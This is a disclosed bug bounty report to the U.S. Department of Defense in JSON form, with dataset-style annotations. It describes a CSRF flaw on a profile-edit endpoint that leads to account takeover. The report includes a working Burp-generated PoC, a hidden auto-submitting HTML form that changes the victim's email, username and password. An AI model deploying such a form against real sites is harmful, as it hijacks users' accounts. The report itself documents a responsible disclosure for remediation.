{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "br0x1337 ",
    "title": "CSRF leads to Account takeover",
    "content": "\nDescription:\nDuring my search in this domain I found it vulnerable to CSRF so I tried to escalate it Account takeover and I succeed\nImpact\nAccount takeover via CSRF\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nVulnerable domain and endpoint : https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\nClick on this URL: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/register and fill in the required fields.\nYou will be instructed to check your inbox for a verification email, but you can avoid this step and log in using the username and password you created on the registration page.\nNavigate to this endpoint https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit and attempt to modify the first name and email and password.\nObserve this in the history of Burp Suite: https://\u2588\u2588\u2588/account/profile/edit.\nYou can notice there is no protection against CSRF on this endpoint.\nExecuted the proof of concept (POC), and it worked.\nPOC\nCode 654 Bytes\n1<html>\n2\n3  <!-- CSRF PoC - generated by Burp Suite Professional -->\n4\n5  <body>\n6\n7    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\" method=\"POST\">\n8\n9      <input type=\"hidden\" name=\"username\" value=\"hacker\" />\n10\n11      <input type=\"hidden\" name=\"password\" value=\"\" />\n12\n13      <input type=\"hidden\" name=\"cpassword\" value=\"\" />\n14\n15      <input type=\"hidden\" name=\"email\" value=\"mojejas248&#64;esterace&#46;com\" />\n16\n17      <input type=\"hidden\" name=\"save\" value=\"Save\" />\n18\n19      <input type=\"submit\" value=\"Submit request\" />\n20\n21    </form>\n22\n23    <script>\n24\n25      history.pushState('', '', '/');\n26\n27      document.forms[0].submit();\n28\n29    </script>\n30\n31  </body>\n32\n33</html>\nSuggested Mitigation/Remediation Actions\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1734569400,
    "report_url": "https://hackerone.com/reports/2699029",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the registration page at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/register and create a new account."
        ],
        [
            2,
            "After registration, log in and visit the profile edit page at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit."
        ],
        [
            3,
            "Modify profile details (e.g., first name, email, password) and observe the request in Burp Suite."
        ],
        [
            4,
            "Note the absence of CSRF protection and craft a malicious HTML form to exploit the vulnerability."
        ],
        [
            5,
            "Execute the PoC to demonstrate account takeover via CSRF."
        ]
    ],
    "vuln_description": "The vulnerability is a CSRF (Cross-Site Request Forgery) flaw that allows an attacker to take over a user's account by tricking them into submitting a malicious form. The endpoint lacks CSRF protection, enabling unauthorized changes to user profiles, including email and password, leading to account takeover.",
    "reason": "The attack is straightforward, involving standard CSRF exploitation techniques without requiring complex interactions or novel logic. The steps are linear and do not involve manipulating complex application states or subtle interactions between components.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}